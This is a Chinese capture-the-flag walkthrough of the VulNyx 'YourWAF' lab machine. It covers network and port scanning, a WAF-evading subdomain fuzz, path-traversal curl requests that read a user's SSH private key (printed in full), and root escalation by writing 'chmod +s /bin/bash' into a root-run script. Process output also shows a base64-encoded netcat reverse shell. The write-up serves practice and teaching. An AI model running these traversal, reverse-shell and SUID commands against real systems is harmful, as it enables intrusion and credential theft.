---
title: VulNyx YourWAF靶机复盘
author: LingMj
data: 2025-01-21
categories: [VulNyx]
tags: [domain,printf]
description: 难度-Easy
---

## 网段扫描
```
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.26.128
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.26.2    00:50:56:e8:d4:e1       (Unknown)
192.168.26.1    00:50:56:c0:00:08       (Unknown)
192.168.26.190  00:0c:29:ae:ed:1d       (Unknown)
192.168.26.254  00:50:56:e5:dc:17       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.899 seconds (134.81 hosts/sec). 4 responded
```

## 端口扫描

```
└─# nmap -p- -sC -sV 192.168.26.190
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-21 02:53 EST
Nmap scan report for 192.168.26.190 (192.168.26.190)
Host is up (0.0098s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 1c:ec:5c:5b:fd:fc:ba:f3:4c:1b:0b:70:e6:ef:bf:12 (ECDSA)
|_  256 26:18:c8:ec:34:aa:d5:b9:28:a1:e2:83:b0:d3:45:2e (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: 403 Forbidden
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 00:0C:29:AE:ED:1D (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.04 seconds
                                                               
```

## 获取webshell
![图 0](../assets/images/9d0bc59c8ef9eafae2192a620bb5f077564d4adf5ce983e89315c22d2ab39116.png)  
![图 1](../assets/images/aab3de0aa823b6188766e0d63b3ab9bd362157689b03ac358b75320804581235.png)  
![图 2](../assets/images/537352d9186579794846f0a583deb3442d13b665ab716571b7756e0d6e88ebf1.png)  
![图 3](../assets/images/2488005ebe8f9db120a2381d13d21ac1df41c658b7ff97ad80933fc74586bc8f.png)  
![图 4](../assets/images/63b9a741d4371798486b056e3f79ac8427176796b518942c5c915c00976e6ebc.png)  

>为了避开waf，wfuzz扫描应该加点权限：wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://192.168.26.190" -H "Host: FUZZ.yourwaf.nyx" -H "User-Agent: Netscape" --hh 0
>

![图 5](../assets/images/de4d400a91353827203ea010a2d9bc170645633f8c74965968f83f918ea637d4.png)  
![图 6](../assets/images/9d10bbc6c65ad28d94979356762b6f2417cc6a7c4bbe11a3294b8da2833cae6c.png)  
![图 7](../assets/images/b94aeb3f018c561f90cf294c2cac4aaccc5ee622e2a5a2de6f5c23b22645e6ba.png)  
![图 8](../assets/images/3a82b00146982b959119c4ac4bb01ca069427a3f5648d006e218b2107e93b791.png)  
![图 9](../assets/images/21a909147097ca0397b5da42e5cf43be46d8e188d42411d69463694cdab29c5a.png)  
![图 10](../assets/images/4c80c0f6cdfdcfc802f792acea48f2603dc9003b548383fabf90c9c7f5357da2.png)  

## 提权
```
www-data@yourwaf:/var/www/maintenance.yourwaf.nyx$ sudo -l
bash: sudo: command not found
www-data@yourwaf:/var/www/maintenance.yourwaf.nyx$ cd /home/
www-data@yourwaf:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 May 15  2024 .
drwxr-xr-x 18 root   root   4096 May 15  2024 ..
drwx------  6 tester tester 4096 May 26  2024 tester
www-data@yourwaf:/home$ 
```
![图 11](../assets/images/b4a3730442e48c7c9d50a6dbc23165e9c26e9273daa9a78bcad34bc4f86c4a4f.png)  
![图 12](../assets/images/3de75398cd8a0f61cd30c213188f6a3fb91621ef75882567cb047cb8457d16f2.png)  
![图 13](../assets/images/bd895944a5d480c0bc9a7f8edfbc7adc94f742ba09c63e474778fdddacb4eb3c.png)  

```
└─# curl http://192.168.26.190:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../../home/tester/user.txt
[1] 22157
                                                                                                                                                                                                                
Error: need file[1]  + done       curl 
┌──(root㉿LingMj)-[/home/lingmj]
└─# curl http://192.168.26.190:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../../home/tester/.ssh/id_rsa
[1] 22195
                                                                                                                                                                                                                
Error: need file[1]  + done       curl 
┌──(root㉿LingMj)-[/home/lingmj]
└─# curl http://192.168.26.190:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../home/tester/.ssh/id_rsa 
[1] 22206
                                                                                                                                                                                                                
Error: need file[1]  + done       curl 
┌──(root㉿LingMj)-[/home/lingmj]
└─# curl http://192.168.26.190:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../home/tester/.ssh/id_rsa > id
[1] 22212
                                                                                                                                                                                                                
Error: need file[1]  + done       curl 
┌──(root㉿LingMj)-[/home/lingmj]
└─# cat id                                                                                                                     
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj]
└─# rm -r id        
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj]
└─# cd xxoo
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# curl http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../home/tester/.ssh/id_rsa     
[1] 22244
                                                                                                                                                                                                                
Error: need file[1]  + done       curl 
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# curl -o id 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../home/tester/.ssh/id_rsa'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   212  100   212    0     0   3739      0 --:--:-- --:--:-- --:--:--  3925
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# cat id                                                                                                                         
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: ENOENT: no such file or directory, stat &#39;/opt/home/tester/.ssh/id_rsa&#39;</pre>
</body>
</html>
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# curl -O  id 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../home/tester/.ssh/id_rsa'
curl: Remote file name has no length
curl: (23) Failed writing received data to disk/application
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# curl -o id 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../home/tester/.ssh/id_rsa'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   212  100   212    0     0   3282      0 --:--:-- --:--:-- --:--:--  3365
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# ls -al
total 28
drwxrwxrwx  2 lingmj lingmj  4096 Jan 21 04:19 .
drwx------ 24 lingmj lingmj  4096 Jan 21 04:18 ..
-rw-------  1 root   root   12288 Dec 12 06:10 .polkit-pwnage.c.swp
-rw-r--r--  1 root   root     212 Jan 21 04:20 id
-rw-r--r--  1 root   root    3267 Jan 21 03:44 index.html
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# cat id                                                                                                                         
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: ENOENT: no such file or directory, stat &#39;/opt/home/tester/.ssh/id_rsa&#39;</pre>
</body>
</html>
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# curl -o id 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../home/tester/.ssh/id_rsa'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2655  100  2655    0     0  38042      0 --:--:-- --:--:-- --:--:-- 39044
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# cat id                                                                                                                            
-----BEGIN OPENSSH PRIVATE KEY-----
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
NOmwKPWS5rqFofpdCmmz/n4nRNM=
-----END OPENSSH PRIVATE KEY-----
```
![图 15](../assets/images/b545bc26198cd18766684a9a6580735f4d00d6422f21f19fb6593b12722ef643.png)  

```
└─# ssh -i id tester@192.168.26.190
The authenticity of host '192.168.26.190 (192.168.26.190)' can't be established.
ED25519 key fingerprint is SHA256:eKRJF+CABz8MdYZ7eyYpm78vY3ESlPqogjwfmF6ZOXk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.26.190' (ED25519) to the list of known hosts.
Enter passphrase for key 'id': 
Linux yourwaf 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May 26 22:47:28 2024 from 192.168.1.116
tester@yourwaf:~$ id
uid=1000(tester) gid=1000(tester) grupos=1000(tester),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),1001(copylogs)
tester@yourwaf:~$ 

```
![图 14](../assets/images/ec787bf1f672796d9552595b73f6bcf2cc1713ecc5bb1fb0ce6697fb3bccf080.png)  

```
tester@yourwaf:/opt/nodeapp$ echo 'chmod +s /bin/bash' > copylogs.sh 
tester@yourwaf:/opt/nodeapp$ ls -al
total 60
drwxr-xr-x  4 root root      4096 may 26  2024 .
drwxr-xr-x  3 root root      4096 may 26  2024 ..
-rwxrwxr-x  1 root copylogs    19 ene 21 10:26 copylogs.sh
-rw-r--r--  1 root root       232 may 26  2024 ecosystem.config.js
drwxr-xr-x  2 root root      4096 may 26  2024 logs
drwxr-xr-x 66 root root      4096 may 26  2024 node_modules
-rw-r--r--  1 root root       303 may 26  2024 package.json
-rw-r--r--  1 root root     25436 may 26  2024 package-lock.json
-rw-r--r--  1 root root      1247 may 26  2024 server.js
tester@yourwaf:/opt/nodeapp$ ps -ef
message+     432       1  0 09:24 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         449       1  0 09:24 ?        00:00:00 /lib/systemd/systemd-logind
root         450       1  0 09:24 ?        00:00:00 dhclient -4 -v -i -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var/lib/dhcp/dhclient6.ens33.leases ens33
root         480       1  0 09:24 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear - linux
root         562       2  0 09:24 ?        00:00:00 [irq/16-vmwgfx]
root         567       1  0 09:24 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         613       1  0 09:24 ?        00:00:01 /usr/sbin/apache2 -k start
www-data     615       1  0 09:24 ?        00:00:00 /usr/bin/htcacheclean -d 120 -p /var/cache/apache2/mod_cache_disk -l 300M -n
www-data     616     613  0 09:24 ?        00:00:00 /usr/sbin/apache2 -k start
www-data     627     613  0 09:24 ?        00:00:01 /usr/sbin/apache2 -k start
www-data     628     613  0 09:24 ?        00:00:02 /usr/sbin/apache2 -k start
www-data     629     613  0 09:24 ?        00:00:02 /usr/sbin/apache2 -k start
www-data     632     613  0 09:24 ?        00:00:02 /usr/sbin/apache2 -k start
www-data     640     613  0 09:24 ?        00:00:02 /usr/sbin/apache2 -k start
www-data     671     613  0 09:24 ?        00:00:02 /usr/sbin/apache2 -k start
www-data     791     628  0 09:25 ?        00:00:00 sh -c printf bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMjYuMTI4IDEyMzQ=|base64 -d|sh
www-data     794     791  0 09:25 ?        00:00:00 sh
www-data     795     794  0 09:25 ?        00:00:00 bash
root         809       1  0 09:26 ?        00:00:14 PM2 v5.4.0: God Daemon (/root/.pm2)
root         820     809  0 09:26 ?        00:00:19 node /opt/nodeapp/server.js
www-data     837     795  0 09:26 ?        00:00:00 /usr/bin/script /dev/null -qc /bin/bash
www-data     838     837  0 09:26 pts/0    00:00:00 sh -c /bin/bash
www-data     839     838  0 09:26 pts/0    00:00:00 /bin/bash
www-data     845     613  0 09:26 ?        00:00:01 /usr/sbin/apache2 -k start
root       11384       2  0 09:39 ?        00:00:08 [kworker/0:1-cgroup_destroy]
root       11877       2  0 10:09 ?        00:00:00 [kworker/u2:2-flush-8:0]
root       11878       2  0 10:09 ?        00:00:00 [kworker/0:0-events]
root       11979       2  0 10:17 ?        00:00:00 [kworker/u2:1-ext4-rsv-conversion]
www-data   12016     613  0 10:19 ?        00:00:00 /usr/sbin/apache2 -k start
root       12086     567  0 10:24 ?        00:00:00 sshd: tester [priv]
root       12091       2  0 10:24 ?        00:00:00 [kworker/0:2-cgroup_destroy]
tester     12092       1  0 10:24 ?        00:00:00 /lib/systemd/systemd --user
root       12093       2  0 10:24 ?        00:00:00 [kworker/0:3-events]
tester     12094   12092  0 10:24 ?        00:00:00 (sd-pam)
tester     12113   12086  0 10:24 ?        00:00:00 sshd: tester@pts/1
tester     12114   12113  0 10:24 pts/1    00:00:00 -bash
root       12119       2  0 10:24 ?        00:00:00 [kworker/u2:0-ext4-rsv-conversion]
tester     12147   12114 99 10:26 pts/1    00:00:00 ps -ef
tester@yourwaf:/opt/nodeapp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 abr 23  2023 /bin/bash
tester@yourwaf:/opt/nodeapp$ /bin/bash -p
bash-5.2# id
uid=1000(tester) gid=1000(tester) euid=0(root) egid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),1000(tester),1001(copylogs)
bash-5.2# 
```

>好了到这里就结束了
>

>userflag:32056d6dd51c2bb5ef2a002c546cc255
>
>rootflag:a86f99d5be34faec32e3cfd477a8a282
>